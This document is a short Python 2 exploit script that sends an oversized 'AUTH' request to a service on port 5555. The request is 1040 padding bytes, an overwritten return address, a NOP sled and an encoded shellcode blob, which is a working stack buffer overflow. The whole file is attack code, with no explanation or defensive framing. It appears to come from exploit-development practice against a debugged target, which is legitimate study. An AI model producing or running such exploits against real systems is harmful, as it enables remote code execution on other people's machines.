#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()
scode=("\xba\x2e\x46\xea\xc3\xdb\xc7\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xc6\x04\x31\x56\x0e\x03\x78\x48\x08\x36\x78\xbc\x4e"
"\xb9\x80\x3d\x2f\x33\x65\x0c\x6f\x27\xee\x3f\x5f\x23\xa2\xb3"
"\x14\x61\x56\x47\x58\xae\x59\xe0\xd7\x88\x54\xf1\x44\xe8\xf7"
"\x71\x97\x3d\xd7\x48\x58\x30\x16\x8c\x85\xb9\x4a\x45\xc1\x6c"
"\x7a\xe2\x9f\xac\xf1\xb8\x0e\xb5\xe6\x09\x30\x94\xb9\x02\x6b"
"\x36\x38\xc6\x07\x7f\x22\x0b\x2d\xc9\xd9\xff\xd9\xc8\x0b\xce"
"\x22\x66\x72\xfe\xd0\x76\xb3\x39\x0b\x0d\xcd\x39\xb6\x16\x0a"
"\x43\x6c\x92\x88\xe3\xe7\x04\x74\x15\x2b\xd2\xff\x19\x80\x90"
"\xa7\x3d\x17\x74\xdc\x3a\x9c\x7b\x32\xcb\xe6\x5f\x96\x97\xbd"
"\xfe\x8f\x7d\x13\xfe\xcf\xdd\xcc\x5a\x84\xf0\x19\xd7\xc7\x9c"
"\xee\xda\xf7\x5c\x79\x6c\x84\x6e\x26\xc6\x02\xc3\xaf\xc0\xd5"
"\x24\x9a\xb5\x49\xdb\x25\xc6\x40\x18\x71\x96\xfa\x89\xfa\x7d"
"\xfa\x36\x2f\xd1\xaa\x98\x80\x92\x1a\x59\x71\x7b\x70\x56\xae"
"\x9b\x7b\xbc\xc7\x36\x86\x57\xe2\xcd\x88\x98\x9a\xd3\x88\xe7"
"\xe1\x5d\x6e\x8d\x05\x08\x39\x3a\xbf\x11\xb1\xdb\x40\x8c\xbc"
"\xdc\xcb\x23\x41\x92\x3b\x49\x51\x43\xcc\x04\x0b\xc2\xd3\xb2"
"\x23\x88\x46\x59\xb3\xc7\x7a\xf6\xe4\x80\x4d\x0f\x60\x3d\xf7"
"\xb9\x96\xbc\x61\x81\x12\x1b\x52\x0c\x9b\xee\xee\x2a\x8b\x36"
"\xee\x76\xff\xe6\xb9\x20\xa9\x40\x10\x83\x03\x1b\xcf\x4d\xc3"
"\xda\x23\x4e\x95\xe2\x69\x38\x79\x52\xc4\x7d\x86\x5b\x80\x89"
"\xff\x81\x30\x75\x2a\x02\x50\x94\xfe\x7f\xf9\x01\x6b\xc2\x64"
"\xb2\x46\x01\x91\x31\x62\xfa\x66\x29\x07\xff\x23\xed\xf4\x8d"
"\x3c\x98\xfa\x22\x3c\x89")
req1 = "AUTH " + 'A'*1040+"\x5c\xfe\xc0\x01"+"\x90"*8+scode
#req1 = "AUTH " + "\x41"*1072
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
